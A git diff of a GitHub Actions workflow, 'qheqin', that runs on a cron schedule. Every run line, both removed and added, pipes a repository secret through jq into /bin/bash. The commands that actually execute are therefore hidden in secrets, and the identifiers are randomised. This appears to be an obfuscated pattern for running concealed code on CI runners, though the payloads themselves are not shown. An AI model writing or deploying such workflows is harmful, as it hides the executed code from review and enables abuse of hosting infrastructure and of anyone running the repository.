@@ -3,37 +3,18 @@ name: qheqin
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 2/6 * * *'
-jobs:  # 20401
+    - cron: '25 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qheqin
         env:
-          mb3633: ${{ secrets.mb3633 }}
+          jck1297: ${{ secrets.jck1297 }}
         run: |
-          echo $mb3633 | jq -r .arr195 | /bin/bash
-          echo $gutj81041 | jq -r .w14590 | /bin/bash
-          echo $shr04622 | jq -r .h278 | /bin/bash
-          echo $g52 | jq -r .j6925 | /bin/bash
-          echo $gw22097 | jq -r .rhuac577 | /bin/bash
-          echo $ek0939 | jq -r .p38199 | /bin/bash
-          echo $onzt25199 | jq -r .uipa9372 | /bin/bash
-          echo $wszkp834 | jq -r .n54436 | /bin/bash
-          echo $o68 | jq -r .ytf57771 | /bin/bash
-          echo $ywi0 | jq -r .qzeob1154 | /bin/bash
-          echo $ym756 | jq -r .ik67723 | /bin/bash
-          echo $nugzf00 | jq -r .z818 | /bin/bash
-          echo $serbz2158 | jq -r .w118 | /bin/bash
-          echo $mq2735 | jq -r .eb2 | /bin/bash
-          echo $c156 | jq -r .uqr2 | /bin/bash
-          echo $mzji55 | jq -r .oliij8 | /bin/bash
-          echo $x9 | jq -r .rzppk62 | /bin/bash
-          echo $kvyh83219 | jq -r .av1 | /bin/bash
-          echo $igpl4814 | jq -r .gtp198 | /bin/bash
-          echo $tg6479 | jq -r .aktp84325 | /bin/bash
-          echo $tb004 | jq -r .d062 | /bin/bash
-          echo $t0 | jq -r .b7 | /bin/bash
+          echo $jck1297 | jq -r .uqgr75030 | /bin/bash
+          echo $tm3 | jq -r .lu740 | /bin/bash
+          echo $ec4758 | jq -r .pb36118 | /bin/bash
 
